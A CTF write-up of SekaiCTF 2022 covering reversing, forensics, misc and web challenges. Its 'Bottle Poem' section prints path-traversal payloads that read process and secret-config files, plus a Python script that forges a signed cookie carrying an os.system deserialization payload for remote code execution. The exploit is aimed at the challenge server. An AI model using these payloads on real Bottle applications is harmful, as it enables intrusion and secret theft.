---
description: >-
  SekaiCTF is a 48-hour CTF event hosted by team Project Sekai. It was held from
  1 Oct - 3 Oct 2022.
---

# SekaiCTF 2022

The event details can be found on [CTFtime](https://ctftime.org/event/1619). The categories in this competition included Web, Crypto, Pwn, Reverse, Misc, Forensics, and Programming (PPC).

I participated in this CTF with 2 other teammates from NTU. I did not commit too much time in this CTF as I had other commitments and preparations to do for school.

<figure><img src=".gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

I participated with the team name `4Xv11$` with my initials `RZ` and solved a few challenge which include `Sanity Check`, `Console Port` and `Survey` challenges. I documented these challenges below as well as other challenges I solved after the event. I also documented some challenges that was solved by my teammate.

<figure><img src=".gitbook/assets/image (648).png" alt=""><figcaption></figcaption></figure>

## Sanity Check

<figure><img src=".gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

Like most "sanity check" kind of challenges, this one was very straightforward. It was similar to what I solved [here](https://gadiel-lau.gitbook.io/2022-writeups/shell-ctf-2022#sanity-check). For this challenge, the flag could be found at the top of the channel.

<figure><img src=".gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

Flag: SEKAI{w31c0m3\_t0\_th3\_w0r1d!}

## Console Port

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

For this challenge, we could connect to the challenge with the command given on our terminal.&#x20;

Once the command is executed, we can proceed to press any key to start.

<figure><img src=".gitbook/assets/image (752).png" alt=""><figcaption></figcaption></figure>

We would need to defuse the bomb before it actually explodes.&#x20;

<figure><img src=".gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure>

At this point, it seemed like the game is "cut off" and we cannot see the full game. I clarified with the challenge creator and indeed I was not seeing the full game. If we go back to the first image when we just executed the command, we would notice that it says `You shall use a terminal with a size of at least 80 columns and 40 rows`. In our case, the number of rows is insufficient, only around 20+ rows which is short of the `40 rows` that we needed.

To solve this simple issue, we could simply open the terminal again, press `CTRL` + `-` to minimize the terminal font/display.

After that is done, we would be presented with a series of random challenges in the game. Our goal is to solve all these mini challenges before the time runs out.

<figure><img src=".gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

In the challenge description, we could refer to[ the manual](https://www.bombmanual.com/) provided. In the manual, we could refer to its respective challenges and solve it accordingly. After solving the 5 different random challenges in the game, we will get the flag.

<figure><img src=".gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

Flag: SEKAI{SenkouToTomoniHibikuBakuon!}

## Matrix Lab 1

<figure><img src=".gitbook/assets/image (722).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was reverse engineering related. We were given a `.class` file. I only managed to decompile the `.class` file into `java` using an [online decompiler](http://www.javadecompilers.com/). My teammate solved the rest of the challenge.

After the code is decompiled, it would look something like this.

```java
import java.util.Scanner;

public class Sekai {
   private static int length = (int)Math.pow(2.0D, 3.0D) - 2;

   public static void main(String[] var0) {
      Scanner var1 = new Scanner(System.in);
      System.out.print("Enter the flag: ");
      String var2 = var1.next();
      if (var2.length() != 43) {
         System.out.println("Oops, wrong flag!");
      } else {
         String var3 = var2.substring(0, length);
         String var4 = var2.substring(length, var2.length() - 1);
         String var5 = var2.substring(var2.length() - 1);
         if (var3.equals("SEKAI{") && var5.equals("}")) {
            assert var4.length() == length * length;

            if (solve(var4)) {
               System.out.println("Congratulations, you got the flag!");
            } else {
               System.out.println("Oops, wrong flag!");
            }
         } else {
            System.out.println("Oops, wrong flag!");
         }

      }
   }

   public static String encrypt(char[] var0, int var1) {
      char[] var2 = new char[length * 2];
      int var3 = length - 1;
      int var4 = length;

      int var5;
      for(var5 = 0; var5 < length * 2; ++var5) {
         var2[var5] = var0[var3--];
         var2[var5 + 1] = var0[var4++];
         ++var5;
      }

      for(var5 = 0; var5 < length * 2; ++var5) {
         var2[var5] ^= (char)var1;
      }

      return String.valueOf(var2);
   }

   public static char[] getArray(char[][] var0, int var1, int var2) {
      char[] var3 = new char[length * 2];
      int var4 = 0;

      int var5;
      for(var5 = 0; var5 < length; ++var5) {
         var3[var4] = var0[var1][var5];
         ++var4;
      }

      for(var5 = 0; var5 < length; ++var5) {
         var3[var4] = var0[var2][length - 1 - var5];
         ++var4;
      }

      return var3;
   }

   public static char[][] transform(char[] var0, int var1) {
      char[][] var2 = new char[var1][var1];

      for(int var3 = 0; var3 < var1 * var1; ++var3) {
         var2[var3 / var1][var3 % var1] = var0[var3];
      }

      return var2;
   }

   public static boolean solve(String var0) {
      char[][] var1 = transform(var0.toCharArray(), length);

      for(int var2 = 0; var2 <= length / 2; ++var2) {
         for(int var3 = 0; var3 < length - 2 * var2 - 1; ++var3) {
            char var4 = var1[var2][var2 + var3];
            var1[var2][var2 + var3] = var1[length - 1 - var2 - var3][var2];
            var1[length - 1 - var2 - var3][var2] = var1[length - 1 - var2][length - 1 - var2 - var3];
            var1[length - 1 - var2][length - 1 - var2 - var3] = var1[var2 + var3][length - 1 - var2];
            var1[var2 + var3][length - 1 - var2] = var4;
         }
      }

      String var10001 = encrypt(getArray(var1, 0, 5), 2);
      return "oz]{R]3l]]B#50es6O4tL23Etr3c10_F4TD2".equals(var10001 + encrypt(getArray(var1, 1, 4), 1) + encrypt(getArray(var1, 2, 3), 0));
   }
}

```

With this piece of java code, the idea is to undo the 90 degrees rotation and unscramble the plaintext after to get the flag. This can be solved by the code below.

```java
import java.util.Scanner;
import java.util.Arrays;
import java.util.Collections;

public class Sekai {
  private static int length = (int) Math.pow(2.0D, 3.0D) - 2; // 6

  public static void main(String[] var0) {
    Scanner scanner = new Scanner(System.in);

    System.out.print("Enter the flag: ");
    String input = scanner.next();

    if (input.length() != 43) {
      System.out.println("Oops, wrong flag!");
    }

    else {
      String substring1 = input.substring(0, length); // index 0 - 5
      String substring2 = input.substring(length, input.length() - 1); // 6-> 42
      String substring3 = input.substring(input.length() - 1); // 43

      if (substring1.equals("SEKAI{") && substring3.equals("}")) {
        assert substring2.length() == length * length;

        if (solve(substring2)) {
          System.out.println("Congratulations, you got the flag!");
        } else {
          System.out.println("Oops, wrong flag!");
        }
      } else {
        System.out.println("Oops, wrong flag!");
      }

    }
    unsolve("oz]{R]3l]]B#50es6O4tL23Etr3c10_F4TD2");
  }

  public static String encrypt(char[] plaintxt, int key) {
    char[] encArray = new char[12];
    int var3 = 5;
    int var4 = length;

    int i;
    for (i = 0; i < 12; ++i) {
      encArray[i] = plaintxt[var3--];
      encArray[i + 1] = plaintxt[var4++];
      ++i;
    }

    for (i = 0; i < 12; ++i) {
      encArray[i] ^= (char) key;
    }

    return String.valueOf(encArray);
  }

  public static char[] getArray(char[][] matrix, int var1, int var2) {
    char[] returnArr = new char[length * 2];
    int j = 0;

    int k;
    for (k = 0; k < length; ++k) {
      returnArr[j] = matrix[var1][k];
      ++j;
    }

    for (k = 0; k < length; ++k) {
      returnArr[j] = matrix[var2][length - 1 - k];
      ++j;
    }

    return returnArr;
  }

  public static char[] getArrayReverse(char[][] matrix, int var1, int var2) {
    char[] returnArr = new char[length * 2];
    int j = 0;

    int k;
    for (k = 0; k < length; ++k) {
      returnArr[j] = matrix[k][length - 1 - var1];
      ++j;
    }

    for (k = 0; k < length; ++k) {
      returnArr[j] = matrix[k][var2];
      ++j;
    }

    return returnArr;
  }

  public static char[][] transform(char[] flagContentCharArr, int length) {
    char[][] matrix = new char[length][length];

    for (int i = 0; i < length * length; ++i) {
      matrix[i / length][i % length] = flagContentCharArr[i];
    }

    return matrix;
  }

  public static void undoRotation(char[][] matrix, int length) {

    // rotate 90 degree clockwise
    for (int i = 0; i <= length / 2; ++i) {
      for (int j = 0; j < length - 2 * i - 1; ++j) {
        char var4 = matrix[i][i + j];
        matrix[i][i + j] = matrix[5 - i - j][i];
        matrix[5 - i - j][i] = matrix[5 - i][5 - i - j];
        matrix[5 - i][5 - i - j] = matrix[i + j][5 - i];
        matrix[i + j][5 - i] = var4;
      }
    }

    // rotate 90 degree clockwise
    for (int i = 0; i <= length / 2; ++i) {
      for (int j = 0; j < length - 2 * i - 1; ++j) {
        char var4 = matrix[i][i + j];
        matrix[i][i + j] = matrix[5 - i - j][i];
        matrix[5 - i - j][i] = matrix[5 - i][5 - i - j];
        matrix[5 - i][5 - i - j] = matrix[i + j][5 - i];
        matrix[i + j][5 - i] = var4;
      }
    }

    // rotate 90 degree clockwise
    for (int i = 0; i <= length / 2; ++i) {
      for (int j = 0; j < length - 2 * i - 1; ++j) {
        char var4 = matrix[i][i + j];
        matrix[i][i + j] = matrix[5 - i - j][i];
        matrix[5 - i - j][i] = matrix[5 - i][5 - i - j];
        matrix[5 - i][5 - i - j] = matrix[i + j][5 - i];
        matrix[i + j][5 - i] = var4;
      }
    }

  }

  public static String decrypt(char[] cipher, int key) {
    char[] decArrayA = new char[6];
    char[] decArrayB = new char[6];
    int indexA = 5;
    int indexB = 0;

    for (int i = 0; i < 12; ++i) {
      cipher[i] ^= (char) key;
    }

    for (int i = 0, j = 1; i < 11 && j < 12; i++, j++) {
      decArrayA[indexA--] = cipher[i++];
      decArrayB[indexB++] = cipher[j++];
    }

    char[] array1and2 = new char[decArrayA.length + decArrayB.length];
    System.arraycopy(decArrayA, 0, array1and2, 0, decArrayA.length);
    System.arraycopy(decArrayB, 0, array1and2, decArrayA.length, decArrayB.length);

    return String.valueOf(array1and2);
  }

  public static void unsolve(String encryptedFlag) { // oz]{R]3l]]B#50es6O4tL23Etr3c10_F4TD2
    String decrypted = decrypt(encryptedFlag.substring(0, 12).toCharArray(), 2) // 0, 5
        + decrypt(encryptedFlag.substring(12, 24).toCharArray(), 1) // 1, 4
        + decrypt(encryptedFlag.substring(24, 36).toCharArray(), 0); // 2,3

    String seg1 = decrypt(encryptedFlag.substring(0, 12).toCharArray(), 2);
    String seg2 = decrypt(encryptedFlag.substring(12, 24).toCharArray(), 1);
    String seg3 = decrypt(encryptedFlag.substring(24, 36).toCharArray(), 0);

    char[] row0 = seg1.substring(0, 6).toCharArray();
    char[] row1 = seg2.substring(0, 6).toCharArray();
    char[] row2 = seg3.substring(0, 6).toCharArray();
    char[] row3 = new StringBuilder(seg3.substring(6, 12)).reverse().toString().toCharArray();
    char[] row4 = new StringBuilder(seg2.substring(6, 12)).reverse().toString().toCharArray();
    char[] row5 = new StringBuilder(seg1.substring(6, 12)).reverse().toString().toCharArray();

    char[][] matrix2 = { row0, row1, row2, row3, row4, row5 };
    undoRotation(matrix2, length);
    // System.out.println(Arrays.deepToString(matrix2));

    StringBuilder sb = new StringBuilder();
    for (char[] s1 : matrix2) {
      sb.append(new String(s1));
    }
    System.out.println(sb.toString());
  }

  public static boolean solve(String flagContent) {
    char[][] matrix = transform(flagContent.toCharArray(), length);
    int five = length - 1;

    for (int i = 0; i <= length / 2; ++i) {
      for (int j = 0; j < length - 2 * i - 1; ++j) {
        char var4 = matrix[i][i + j];
        matrix[i][i + j] = matrix[5 - i - j][i];
        matrix[5 - i - j][i] = matrix[5 - i][5 - i - j];
        matrix[5 - i][5 - i - j] = matrix[i + j][5 - i];
        matrix[i + j][5 - i] = var4;
      }
    }

    // System.out.println(encrypt("1234567890ab".toCharArray(), 1));
    // // encrypt(getArray(matrix, 2, 3), 0));
    // System.out.println(decrypt("764958213`0c".toCharArray(), 1));
    System.out.println(getArray(matrix, 0, 5));
    System.out.println(getArray(matrix, 1, 4));
    System.out.println(getArray(matrix, 2, 3));

    return "oz]{R]3l]]B#50es6O4tL23Etr3c10_F4TD2"
        .equals(encrypt(getArray(matrix, 0, 5), 2) +
            encrypt(getArray(matrix, 1, 4), 1) +
            encrypt(getArray(matrix, 2, 3), 0));
  }
}
```

Using the above code, we could compile the java file and execute it to get the flag.

<figure><img src=".gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

Flag: SEKAI{m4tr1x\_d3cryP710N\_15\_Fun\_M4T3\_@2D2D!}

## Bottle Poem

<figure><img src=".gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was under the Web category. I worked together with my teammate and we solved this challenge during the CTF.

We were given a link. Upon browsing the link, we could see 3 different links which would lead us to 3 different poems.

<figure><img src=".gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>

If we click on the first link, it would bring us to this `Spring` poem. Upon further inspection, it is just a poem.

<figure><img src=".gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

The second and third links are similar. Nothing special, just different poems.

If we take a closer look at the URL, we would notice `id=spring.txt`. We could proceed to check for `Local File Inclusion`. By changing the value of `id` to `/proc/self/cmdline`, we could get the executable path. Alternatively, we could do a path traversal by going `../../../../proc/self/status` to find the `pid` of the web app. After we found out that the `pid` is `7`, we could use `../../../../proc/7/cmdline` to extract the command that starts up the web server.

<figure><img src=".gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>



We then proceed to `/proc/self/cwd/app.py` to read the source code. Alternatively, we could use `../../../../app/config/secret.py` to perform a directory traversal on the webpage.

```python
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)
```

There were 2 things I noticed here.&#x20;

1. It was using the bottle module in Python. The challenge title also did mention `Bottle`. Thus, I guess this could be a challenge related to `Bottle`.
2. The code imports `sekai` which suggests that it is getting information from `config` path.

I proceeded to go to [http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py](http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py).

We would see the value of `sekai` on the page.&#x20;

<figure><img src=".gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

At this point, my teammate and I were stuck at the challenge for some time. After awhile, I found an article on [bottle cookie mechanism](https://pwp.stevecassidy.net/bottle/cookies/). If we follow it, we would get the cookie for `admin` after running the code in Python.

<figure><img src=".gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>

I changed the cookie value in `EditThisCookie` and refreshed the page. However, this brought us to what seemed like dead end. The page only says `Hello, you are admin, but it's useless`.&#x20;

<figure><img src=".gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>

After some research on `Bottle cookie` and reading through the [documentation](https://bottlepy.org/docs/dev/bottle-docs.pdf), we found on page 51 that we could probably use `Pickle` to perform `Remote Code Execution`.

<figure><img src=".gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

Here my teammate constructed a simple python script, somehow without the use of `Pickle` to solve the challenge.

```
from bottle import request, response
import requests

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ("/flag > /tmp/output",))

sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
session = Exploit()
response.set_cookie("name", session, secret=sekai)
print(response)

r = requests.get("http://bottle-poem.ctf.sekai.team/show?id=/tmp/output")
print(r.text)
```

<figure><img src=".gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>

The intended solution was to use `Pickle` and `RCE` like [this](https://github.com/bottlepy/bottle/issues/900) to get the flag.

Flag: SEKAI{W3lcome\_To\_Our\_Bottle}

## Broken Converter

<figure><img src=".gitbook/assets/image (720).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was under the forensics category. We were given a `.xps` file. I was close to solve this challenge during the CTF, I eventually solved it after the CTF.

XPS files are like [OOXML](https://en.wikipedia.org/wiki/Office\_Open\_XML) files (MS Office files): mainly XML files inside a ZIP container, e.g. a file according to the [Open Packaging Conventions](https://en.wikipedia.org/wiki/Open\_Packaging\_Conventions) specification. Read more about XPS on [Wikipedia](https://en.wikipedia.org/wiki/Open\_XML\_Paper\_Specification).&#x20;

<figure><img src=".gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

We can proceed to unzip this `.xps` file. Previously, I had solved a challenge in another CTF where I unzip `OOXML` file [here](https://gadiel-lau.gitbook.io/2022-writeups/downunderctf-2022#doxme).

<figure><img src=".gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

At this point, I chanced upon some articles [here ](https://isc.sans.edu/diary/Analyzing+XPS+files/23804)and [here ](https://videos.didierstevens.com/2018/06/30/analyzing-xps-files/)after doing some research on `xps file forensics`.

I tried applying it to this challenge itself.

<figure><img src=".gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (634).png" alt=""><figcaption></figcaption></figure>

I extracted the UnicodeString from the `xps` file but it looked like I was going in the wrong direction.

<figure><img src=".gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

If I go right back to the beginning when I extracted the files, I would notice that there is a `.odttf` file extracted to `resources`.

`ODTTF` file is a obfuscated OpenType file, you could read more about it [here](https://en.wikipedia.org/wiki/ODTTF). Basically, we could upload this file to an [online ODTTF demo](https://somanchiu.github.io/odttf2ttf/js/demo) and this would give us a `TTF` file. TTF files are TrueType font files, you could read more about it [here](https://docs.fileformat.com/font/ttf/).

<figure><img src=".gitbook/assets/image (691).png" alt=""><figcaption></figcaption></figure>

After we saved the TTF file, we could open the `.ttf` file in programs that sort by ASCII such as [FontDrop!](https://fontdrop.info/) or [FontForge](https://fontforge.org/).

Since FontForge requires download, I choose the online solution and used FontDrop! to solve this challenge. If we open up the `.ttf` file, we could see the flag displayed under `Glyphs`.

<figure><img src=".gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

Flag: SEKAI{sCR4MBLeD\_a5ci1-FONT+GlYPHZ,W3|!.d0n&}

## flag Mono

<figure><img src=".gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

For this challenge, it shared the same file as the previous challenge `Broken Converter`.

We could simply proceed to solve this challenge from where we left off in the previous challenge. After we loaded the `.ttf` file in `FontDrop!`, we could click on the different buttons on OpenType features to yield the flag.

<figure><img src=".gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

If we enable `ss01`, we will see the first part of the flag.

<figure><img src=".gitbook/assets/image (990).png" alt=""><figcaption></figcaption></figure>

If we disable `ss01` and click on `ss02`, we would get the second part of the flag.

<figure><img src=".gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

Similarly, following the same procedure we will get third part of the flag.

<figure><img src=".gitbook/assets/image (690).png" alt=""><figcaption></figcaption></figure>

Finally, we would get the final part of the flag.

<figure><img src=".gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

Combing the 4 different parts obtained above, we would get the flag.

Flag: SEKAI{OpenTypeMagicGSUBIsTuringComplete}

## Sus

<figure><img src=".gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

For this challenge, it was under the MISC category. We were given a `.sus` file. This challenge is actually pretty straightforward and I solved it after the CTF.

We can load the `.sus` file into an[ online website ](https://sekai-sus-2img.vercel.app/)and we can see the flag drawn letter by letter with sliders.

Once we load the file we will get this bunch of text.

```
#00008:01
#00114:12120000
#00118:0026000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00116:0000000000000000001200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00112:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000121600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00212:22
#00216:22
#0021a:00120000
#0031b:00230000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0031a:00000000001300000000000000130000000000000000000000000000001300000000000000000000000000000000000000000000000000000000000000000000
#00318:00000000000000000000000000000000001300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00414:22120000
#0041a:11
#0041b:11
#00416:0000000000000000001200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00418:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0041c:0012000000000000
#00412:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000121600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00514:12
#00518:2222000000000000
#0051c:2212000000000000
#00612:22
#0061a:11
#00619:11000011000000000000000000000000
#0061c:00000012000000000000000000000000
#00616:00000012000000000000000000000000
#00712:1111000000000000
#00715:1111000000000000
#00717:21
#00718:21
#0071b:21
#0071c:21
#00812:0000000000000000000000000000000000140000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00912:22
#00916:22
#00918:1212000000000000
#0091c:1212000000000000
#00914:00000014000000000000000000000000
#0101a:21
#0101b:21
#01018:220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0101c:0012000000000000
#01115:21
#01114:21
#01116:220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0111a:12
#01112:0012000000000000
#0111c:00120000
#01218:22000026000000000000000000000000
#01212:00000022
#01314:22
#01319:12
#0131c:12
#BPM01:00
#0131b:11
#01412:1212000000000000
#01416:1212000000000000
#0141a:22
#01512:22
#01516:22
#01518:00000016000000000000000000000000
#0161b:22
#01612:00000016000000000000000000000000
